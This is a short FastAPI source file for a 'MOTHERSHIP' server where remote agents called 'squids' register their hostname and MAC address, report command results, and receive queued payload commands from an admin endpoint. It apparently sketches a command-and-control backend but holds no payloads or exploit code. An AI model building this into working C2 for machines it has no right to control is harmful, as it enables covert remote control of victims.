from fastapi import FastAPI
from pydantic import BaseModel
from mdc import get_database, insert_document

class Squid(BaseModel):
    id: str
    group: str
    hostname: str
    mac: int
    timestamp: float

    def to_mongo(self):
        return {"_id": self.id, "group": self.group, "hostname": self.hostname, "mac": self.mac, "timestamp": self.timestamp}


class Call(BaseModel):
    squid_id: str
    qcommand_id: str
    result: str
    timestamp: float


class Qcommand(BaseModel):
    target_id: str
    module: int
    payload: str
    created: float
    status: str
    # status = [QUEUED, ISSUED, FAILED, COMPLETED]


app = FastAPI()


@app.get("/")
async def root():
    return {"message": "MOTHERSHIP"}


@app.post("/squids/home/")
def squids_checkin(call: Call):
    response = insert_document("calls", vars(call))
    return {"message": response}


@app.post("/squids/register/")
def squids_registration(squid: Squid):
    response = insert_document("squids", squid.to_mongo())
    return {"message": response}


@app.post("/admin/qcommand")
def admin_qcommand(qcommand: Qcommand):
    response = insert_document("qcommands", vars(qcommand))
    return {"message": response}